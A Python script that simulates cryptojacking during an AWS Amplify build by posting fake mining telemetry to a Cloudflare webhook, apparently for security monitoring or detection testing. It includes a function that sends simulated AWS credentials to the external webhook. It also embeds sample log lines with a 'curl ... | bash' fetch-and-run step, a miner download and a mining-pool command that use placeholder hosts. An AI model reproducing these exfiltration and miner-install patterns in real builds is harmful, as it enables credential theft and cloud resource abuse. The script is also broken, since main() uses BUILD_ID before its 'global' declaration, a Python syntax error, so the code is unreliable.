#!/usr/bin/env python3
"""
AWS Amplify Cryptomining Simulator

This script simulates the behavior of a cryptocurrency miner running in AWS Amplify
during the build phase. It reports activity to a Cloudflare webhook for monitoring.

Environment Variables:
- CLOUDFLARE_WEBHOOK_URL: Your Cloudflare webhook URL (required)
- SERVICE: Service name (default: amplify)
- WORKER: Worker name (default: amplify-hostname)
- ALGO: Mining algorithm to simulate (default: randomx)
- AWS_ACCESS_KEY_ID: AWS access key (optional, for realism)
- AWS_SECRET_ACCESS_KEY: AWS secret key (optional, for realism)
- AWS_DEFAULT_REGION: AWS region (default: us-east-1)
"""

import os
import sys
import time
import json
import uuid
import socket
import random
import threading
import platform
import requests
from datetime import datetime

# Configuration
CLOUDFLARE_WEBHOOK_URL = os.environ.get('CLOUDFLARE_WEBHOOK_URL', '')
SERVICE = os.environ.get('SERVICE', 'amplify')
WORKER = os.environ.get('WORKER', f"amplify-{socket.gethostname()}")
ALGO = os.environ.get('ALGO', 'randomx')
REGION = os.environ.get('AWS_DEFAULT_REGION', 'us-east-1')

# Generate unique identifiers
INSTANCE_ID = f"i-{uuid.uuid4().hex[:8]}"
BUILD_ID = f"{uuid.uuid4().hex[:8]}"
APP_ID = f"d{uuid.uuid4().hex[:8]}"

# For simulating realistic AWS Amplify behavior
AMPLIFY_DOMAIN = f"{BUILD_ID}.amplifyapp.com"
AMPLIFY_STAGES = ["PROVISIONING", "DOWNLOAD_SOURCE", "BUILD", "DEPLOY", "VERIFY"]
AMPLIFY_CURRENT_STAGE = 0

# Logging setup
def log(message):
    """Simple logging function"""
    print(f"[{datetime.now().isoformat()}] {message}")

def send_webhook(message, color="good", additional_fields=None):
    """Send report to Cloudflare webhook"""
    try:
        # Create basic fields
        fields = [
            {
                "title": "Service",
                "value": SERVICE,
                "short": True
            },
            {
                "title": "Worker",
                "value": WORKER,
                "short": True
            },
            {
                "title": "Algorithm",
                "value": ALGO,
                "short": True
            },
            {
                "title": "Region",
                "value": REGION,
                "short": True
            },
            {
                "title": "Build Stage",
                "value": AMPLIFY_STAGES[AMPLIFY_CURRENT_STAGE],
                "short": True
            }
        ]

        # Add any additional fields
        if additional_fields:
            fields.extend(additional_fields)

        # Create the payload
        payload = {
            "attachments": [
                {
                    "fallback": f"AWS {SERVICE} Simulation: {message}",
                    "color": color,
                    "title": f"Simulated AWS {SERVICE} Cryptominer",
                    "text": message,
                    "fields": fields,
                    "footer": f"App: {APP_ID} | Build: {BUILD_ID} | Instance: {INSTANCE_ID}",
                    "ts": int(time.time())
                }
            ]
        }

        # Send the webhook
        response = requests.post(
            CLOUDFLARE_WEBHOOK_URL,
            json=payload,
            headers={'Content-Type': 'application/json'}
        )

        if response.status_code == 200:
            log(f"Webhook sent: {message}")
            return True
        else:
            log(f"Failed to send webhook: {response.status_code} - {response.text}")
            return False

    except Exception as e:
        log(f"Error sending webhook: {e}")
        return False

def simulate_build_process():
    """Simulate the Amplify build process"""
    global AMPLIFY_CURRENT_STAGE
    
    # Initial report
    send_webhook(f"Build started: {BUILD_ID}")
    
    # Simulate each build stage
    for i, stage in enumerate(AMPLIFY_STAGES):
        AMPLIFY_CURRENT_STAGE = i
        
        # Stage duration varies
        duration = random.randint(30, 90) if stage == "BUILD" else random.randint(10, 30)
        
        log(f"Entering stage: {stage} (estimated duration: {duration}s)")
        send_webhook(f"Stage started: {stage}")
        
        # If we're in the BUILD stage, this is where the "mining" would happen
        if stage == "BUILD":
            # Simulate mining activity
            simulate_mining(duration)
        else:
            # Just wait for non-mining stages
            time.sleep(duration)
        
        send_webhook(f"Stage completed: {stage}")
    
    # Final report
    send_webhook(f"Build completed: {BUILD_ID}", "good", [
        {
            "title": "Build URL",
            "value": f"https://{AMPLIFY_DOMAIN}",
            "short": False
        }
    ])

def simulate_mining(duration):
    """Simulate mining activity during the build phase"""
    start_time = time.time()
    shares_found = 0
    shares_accepted = 0
    
    # Initial mining report
    send_webhook("Mining started during BUILD phase", "warning")
    
    # Create fake hash rate based on CPU count
    cpu_count = os.cpu_count() or 2
    hashrate = random.uniform(10.0, 25.0) * cpu_count
    
    # Report periodically during mining
    while time.time() - start_time < duration:
        # Simulate finding shares
        if random.random() < 0.3:  # 30% chance per interval
            shares_found += 1
            shares_accepted += 1
            
            # Report new shares
            log(f"Found share: {shares_accepted}/{shares_found}")
        
        # Periodic status update every ~20 seconds
        if random.random() < 0.2:  # 20% chance per interval
            # Calculate elapsed time
            elapsed = time.time() - start_time
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            seconds = int(elapsed % 60)
            
            # Send status update
            send_webhook(
                f"Mining in progress: {shares_accepted} shares found",
                "warning",
                [
                    {
                        "title": "Hashrate",
                        "value": f"{hashrate:.2f} MH/s",
                        "short": True
                    },
                    {
                        "title": "Runtime",
                        "value": f"{hours:02d}:{minutes:02d}:{seconds:02d}",
                        "short": True
                    },
                    {
                        "title": "Shares",
                        "value": f"{shares_accepted}/{shares_found}",
                        "short": True
                    }
                ]
            )
        
        # Sleep for 5-10 seconds between checks
        time.sleep(random.uniform(5, 10))
    
    # Final mining report
    elapsed = duration
    hours = int(elapsed // 3600)
    minutes = int((elapsed % 3600) // 60)
    seconds = int(elapsed % 60)
    
    send_webhook(
        f"Mining completed: {shares_accepted} shares found",
        "warning",
        [
            {
                "title": "Hashrate",
                "value": f"{hashrate:.2f} MH/s",
                "short": True
            },
            {
                "title": "Runtime",
                "value": f"{hours:02d}:{minutes:02d}:{seconds:02d}",
                "short": True
            },
            {
                "title": "Shares",
                "value": f"{shares_accepted}/{shares_found}",
                "short": True
            }
        ]
    )

def simulate_aws_credentials():
    """Occasionally simulate AWS credential leakage for security testing"""
    if random.random() < 0.1:  # 10% chance
        # Generate fake AWS credentials
        fake_aws_access_key = f"AKIA{uuid.uuid4().hex[:16].upper()}"
        fake_aws_secret_key = ''.join(random.choice(
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/="
        ) for _ in range(40))
        
        log("Simulating AWS credential leak (for security testing)")
        send_webhook(
            "Build environment contains AWS credentials",
            "danger",
            [
                {
                    "title": "AWS Credentials (Simulated)",
                    "value": f"Access Key: {fake_aws_access_key}\nSecret Key: {fake_aws_secret_key}",
                    "short": False
                }
            ]
        )

def simulate_amplify_build_logs():
    """Simulate the generation of build logs with suspicious commands"""
    build_logs = [
        "2025-01-01T00:00:01.000Z [INFO] Starting build...",
        "2025-01-01T00:00:02.123Z [INFO] Downloading source from repo...",
        "2025-01-01T00:00:10.456Z [INFO] Installing dependencies...",
        "2025-01-01T00:00:15.789Z [INFO] npm install --quiet",
        "2025-01-01T00:00:30.987Z [INFO] Building project...",
        "2025-01-01T00:00:35.654Z [INFO] npm run build",
        f"2025-01-01T00:00:40.321Z [INFO] Executing curl -s https://raw.githubusercontent.com/user/repo/{uuid.uuid4().hex[:7]}/setup.sh | bash",
        f"2025-01-01T00:00:42.765Z [INFO] Downloading binary from https://cdn.example.com/miner-v1.2.3.tar.gz",
        "2025-01-01T00:00:45.123Z [INFO] Setting execution permissions: chmod +x ./miner",
        "2025-01-01T00:00:46.789Z [INFO] Executing ./miner --daemon --algo randomx --pool pool.example.com:3333 --user worker123",
        "2025-01-01T00:00:48.456Z [INFO] Process started with PID 12345",
        "2025-01-01T00:00:50.789Z [INFO] Continuing with normal build tasks...",
        "2025-01-01T00:01:30.123Z [INFO] Build completed successfully"
    ]

    send_webhook(
        "Build logs contain suspicious commands",
        "danger",
        [
            {
                "title": "Build Logs (Sample)",
                "value": "\n".join(build_logs[6:11]) + "...",
                "short": False
            }
        ]
    )

def main():
    """Main execution function"""
    if not CLOUDFLARE_WEBHOOK_URL:
        log("Error: CLOUDFLARE_WEBHOOK_URL environment variable is required")
        sys.exit(1)

    log(f"Starting AWS {SERVICE} cryptomining simulation")
    log(f"Worker: {WORKER}")
    log(f"Instance ID: {INSTANCE_ID}")
    log(f"Build ID: {BUILD_ID}")
    log(f"App ID: {APP_ID}")

    # Simulate occasional AWS credential leak
    simulate_aws_credentials()
    
    # Main simulation loop
    try:
        # Simulate the build process once
        simulate_build_process()
        
        # After the build completes, simulate build logs
        simulate_amplify_build_logs()
        
        # Keep the container running and periodically start new builds
        while True:
            # Wait between 30-60 minutes before starting a new build
            wait_time = random.randint(1800, 3600)
            log(f"Waiting for {wait_time} seconds before next build...")
            time.sleep(wait_time)
            
            # Generate new build ID for the next run
            global BUILD_ID
            BUILD_ID = f"{uuid.uuid4().hex[:8]}"
            log(f"Starting new build: {BUILD_ID}")
            
            # Run another build cycle
            simulate_build_process()
            simulate_amplify_build_logs()
    
    except KeyboardInterrupt:
        log("Simulation interrupted, shutting down...")
        send_webhook("Simulation stopped", "danger")
    
    except Exception as e:
        log(f"Error in simulation: {e}")
        send_webhook(f"Simulation error: {str(e)}", "danger")

if __name__ == "__main__":
    main()
